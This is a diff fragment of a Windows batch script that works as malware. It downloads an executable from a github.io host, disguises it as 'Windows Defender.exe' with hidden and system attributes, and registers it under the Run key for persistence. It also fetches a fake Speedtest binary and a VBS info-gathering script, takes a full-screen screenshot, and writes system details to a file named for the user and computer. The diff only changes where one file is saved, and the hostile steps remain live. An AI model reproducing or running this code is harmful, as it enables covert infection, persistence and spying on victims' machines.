@@ -14,15 +14,12 @@ attrib -s -h -i "%AppData%\Microsoft\Windows\Windows Defender.exe"
 curl.exe %proxy% https://cryptedlumos.github.io/sfx.exe --output "%AppData%\Microsoft\Windows\Windows Defender.exe" && attrib +s +h +i "%AppData%\Microsoft\Windows\Windows Defender.exe"
 REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Defender" /t REG_SZ /F /D "%AppData%\Microsoft\Windows\Windows Defender.exe -P\"rofile of Windows Defender [Microsoft Corporation]"\"
 
-attrib +s +h +i  "%AppData%\Microsoft\Windows\Templates"
-
 mkdir "%appdata%\Ookla\Speedtest CLI" && attrib +s +h +i "%appdata%\Ookla"
 
 curl.exe %proxy% https://cryptedlumos.github.io/Capture/speedtest-cli.ini --output "%appdata%\Ookla\Speedtest CLI\speedtest-cli.ini" 
 curl.exe %proxy% https://cryptedlumos.github.io/Capture/speedtest.exe --output "%appdata%\Ookla\Speedtest CLI\speedtest.exe"
-cd "%AppData%\Microsoft\Windows\Templates"
 
-curl.exe %proxy% https://cryptedlumos.github.io/Capture/osinfo.vbs --output "%AppData%\Microsoft\Windows\Templates\osinfo.vbs"
+curl.exe %proxy% https://cryptedlumos.github.io/Capture/osinfo.vbs --output "osinfo.vbs"
 nircmd.exe savescreenshotfull "%username%@%computername% ~$currdate.dd_MM_yyyy$ ~$currtime.HH.mm$.png"
 cscript.exe /nologo osinfo.vbs > "%username%@%computername%.txt"
 echo      =================== >> "%username%@%computername%.txt"
